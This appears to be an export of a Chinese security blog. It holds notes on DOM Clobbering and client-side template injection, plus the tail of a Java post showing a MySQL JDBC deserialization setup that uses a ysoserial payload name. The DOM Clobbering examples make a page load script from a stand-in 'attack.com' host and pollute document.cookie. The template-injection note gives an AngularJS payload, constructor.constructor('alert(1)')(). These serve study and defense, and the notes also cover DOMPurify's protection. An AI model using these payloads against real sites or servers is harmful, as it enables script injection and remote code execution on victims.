<h3 id="8-0-7-8-0-20"><a href="#8-0-7-8-0-20" class="headerlink" title="8.0.7-8.0.20"></a>8.0.7-8.0.20</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全8-DOM Clobbering（笔记）</title>
    <url>/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这一章的攻击手法是通过改变DOM，然后js会对DOM进行操作造成的漏洞，干解释还是太干燥了，还是上代码吧</p>
<ul>
<li><a href="https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/">https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/</a><span id="more"></span>
</li>
</ul>
<h1 id="window"><a href="#window" class="headerlink" title="window"></a>window</h1><p>在讲DOM Clobbering之前，先得了解什么叫做window<br><a href="https://www.w3schools.com/js/js_window.asp">https://www.w3schools.com/js/js_window.asp</a><br>这篇文章有简单的介绍<br>在一个窗口下，所有的全局javascript对象，都归到window底下，也就是平时的什么<code>alert</code>，其实就是<code>window.alert</code><br>可以在浏览器控制台自己输入下面的代码去验证<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert == <span class="variable language_">window</span>.<span class="property">alert</span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure></p>
<p>详细的介绍可以看看这篇<br><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window">https://developer.mozilla.org/en-US/docs/Web/API/Window</a><br><a href="https://www.jianshu.com/p/e5ca92d68daa">https://www.jianshu.com/p/e5ca92d68daa</a></p>
<h1 id="操作带id的tag"><a href="#操作带id的tag" class="headerlink" title="操作带id的tag"></a>操作带id的tag</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;button id=&quot;btn&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    // TODO: add click event listener to button</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>上面的代码应该怎么对这个button进行操作呢，比如让他弹窗。<br>下面给出代码<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>)</span><br><span class="line">  .<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><br>但是其实并不需要<code>document.getElementById</code>，<code>window.btn</code>也可以直接获取到，然后因为在window下面，所以可以直接用<code>btn</code>访问</p>
<p>所以直接用下面的代码就行了<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">btn.<span class="property">onclick</span>=<span class="function">()=&gt;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><br>根据官方文档 <a href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object">https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object</a><br><code>embed</code>, <code>form</code>, <code>img</code>, and <code>object</code>这几个标签的<code>name</code>属性也是可以被window直接获取的<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;b&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">&quot;c&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">name</span>=<span class="string">&quot;d&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt></p>
<p>按理来说的话 <code>iframe</code> 标签应该也算是有这种特性<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="DOM-Clobbering入门"><a href="#DOM-Clobbering入门" class="headerlink" title="DOM Clobbering入门"></a>DOM Clobbering入门</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>留言板<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    你的留言：<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;TEST_MODE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;TEST_SCRIPT_SRC&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://attack.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">TEST_MODE</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// load test script</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">src</span> = <span class="variable language_">window</span>.<span class="property">TEST_SCRIPT_SRC</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样子<code>script.src = window.TEST_SCRIPT_SRC</code>就会加载到a标签的href了，这里为什么不会把<code>&lt;a id=&quot;TEST_SCRIPT_SRC&quot; href=&quot;http://attack.com&quot;&gt;&lt;/a&gt;</code>赋值给<code>script.src</code>呢，这里的实际操作其实是<br><code>script.src = TEST_SCRIPT_SRC.toString()</code><br>这里有一个小trick，当标签是<code>&lt;a&gt;</code>或者<code>&lt;base&gt;</code>，toString()会返回他们的href</p>
<p>当变量已经存在的时候，就无法通过id进行覆盖了<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    TEST_MODE = 1</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;TEST_MODE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">TEST_MODE</span>) <span class="comment">// 1</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="多层的DOM-Clobbering"><a href="#多层的DOM-Clobbering" class="headerlink" title="多层的DOM Clobbering"></a>多层的DOM Clobbering</h1><p>在上一节只是覆盖单个变量，当需要覆盖对象应该如何操作，比如覆盖掉<code>config.isTest</code>，有几种方法进行覆盖</p>
<ol>
<li><p>form</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;isTest&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;isProd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    console.log(config) // <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    console.log(config.isTest) // <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;isTest&quot;</span> /&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    console.log(config.isProd) // <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;isProd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这种方法有一种缺陷，无法使用上一节讲的<code>&lt;a&gt;</code>或者<code>&lt;base&gt;</code>标签进行toString的覆盖，只能说是覆盖<code>config.isTest.value</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;enviroment&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">enviroment</span>.<span class="property">value</span>) <span class="comment">// test</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>HTMLCollection<br>这种方法在firefox上不可用，只能在chrome上用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://123&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span> <span class="attr">name</span>=<span class="string">&quot;apiUrl&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://huli.tw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当有两个相同的id的时候，就会生成<code>HTMLCollection</code><br><img src="/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>可以看到可以通过name属性来获取到值，当然还有其他的<br><img src="/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>通过<code>config.config</code>可以获取到第一个，<code>config.apiUrl</code>可以获取到第二个，接下来的操作就和上一节一样了</p>
</li>
</ol>
<p>覆盖三层的话就可以把两个<code>&lt;a&gt;</code>改为<code>&lt;form&gt;</code><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span> <span class="attr">name</span>=<span class="string">&quot;prod&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;apiUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">prod</span>.<span class="property">apiUrl</span>.<span class="property">value</span>) <span class="comment">//123</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h1 id="更多层的DOM-Clobbering"><a href="#更多层的DOM-Clobbering" class="headerlink" title="更多层的DOM Clobbering"></a>更多层的DOM Clobbering</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;config&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;a id=&quot;apiUrl&quot;&gt;&lt;/a&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">apiUrl</span>) <span class="comment">// &lt;a id=&quot;apiUrl&quot;&gt;&lt;/a&gt;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以通过iframe创建更多的层级，用<code>setTimeout</code>是因为并不是同步加载的<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;moreLevel&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;form id=&quot;config&quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;form id=&quot;config&quot; name=&quot;prod&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">      &lt;input name=&quot;apiUrl&quot; value=&quot;123&quot; /&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(moreLevel.<span class="property">config</span>.<span class="property">prod</span>.<span class="property">apiUrl</span>.<span class="property">value</span>) <span class="comment">//123</span></span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="拓展攻击面"><a href="#拓展攻击面" class="headerlink" title="拓展攻击面"></a>拓展攻击面</h1><p>前面几节的攻击手法都是攻击<code>window</code>下面的变量，但是他有几个标签属性可以影响到<code>document</code><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">cookie</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">name</span>=<span class="string">lastElementChild</span>&gt;</span>I am first child<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>I am last child<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">embed</span> <span class="attr">name</span>=<span class="string">getElementById</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// &lt;img name=&quot;cookie&quot;&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#test&#x27;</span>).<span class="property">lastElementChild</span>) <span class="comment">// &lt;div&gt;I am last child&lt;/div&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">getElementById</span>) <span class="comment">// &lt;embed name=getElementById&gt;&lt;/embed&gt;</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>与原型链污染搭配一起使用，就可以达到污染cookie的效果<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">cookie</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 先假設我們可以 pollute 成 function</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span> = <span class="function">() =&gt;</span> <span class="string">&#x27;a=1&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`cookie: <span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>) <span class="comment">// cookie: a=1</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>先把cookie给改成html元素，然后原型链污染<br><code>Object.prototype.toString = () =&gt; &#39;a=1&#39;</code><br>是匿名函数的使用，让 <code>toString</code> 返回字符串 <code>a=1</code></p>
<p>DOMPurify中的代码就会过滤这种情况<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://github.com/cure53/DOMPurify/blob/d5060b309b5942fc5698070fbce83a781d31b8e9/src/purify.js#L1102</span></span><br><span class="line"><span class="keyword">const</span> _isValidAttribute = <span class="keyword">function</span> (<span class="params">lcTag, lcName, value</span>) &#123;</span><br><span class="line">  <span class="comment">/* Make sure attribute cannot clobber */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="variable constant_">SANITIZE_DOM</span> &amp;&amp;</span><br><span class="line">    (lcName === <span class="string">&#x27;id&#x27;</span> || lcName === <span class="string">&#x27;name&#x27;</span>) &amp;&amp;</span><br><span class="line">    (value <span class="keyword">in</span> <span class="variable language_">document</span> || value <span class="keyword">in</span> formElement)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果你的<code>name</code>或<code>id</code>存在于document中，就会直接返回false</p>
<p>Sanitizer API 就不会帮你做这方面的防护</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题3</title>
    <url>/2023/10/14/%E5%88%B7%E9%A2%983/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="b5ce060abdfddfaba9dc54e30d5de89f62baeccfc6619c7bf845b2d9554901dd"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>前端安全9-CSTI（笔记）</title>
    <url>/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A89-CSTI%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前端的SSTI，也就是C就是client。这篇没有太多可记的点，想深入又太深了，只能讲些较浅的。</p>
<ul>
<li><a href="https://aszx87410.github.io/beyond-xss/ch3/csti/">https://aszx87410.github.io/beyond-xss/ch3/csti/</a><span id="more"></span>
</li>
</ul>
<h1 id="AngularJS"><a href="#AngularJS" class="headerlink" title="AngularJS"></a>AngularJS</h1><p>在模板中，因为无法存取到window，就不存在<code>alert</code>，那如果想弹窗应该怎么办。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">constructor.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure><br>可以用上面的代码去创建一个匿名函数去执行<code>alert</code></p>
<blockquote>
<p><code>constructor.constructor == Function</code> 这两个是等价的</p>
</blockquote>
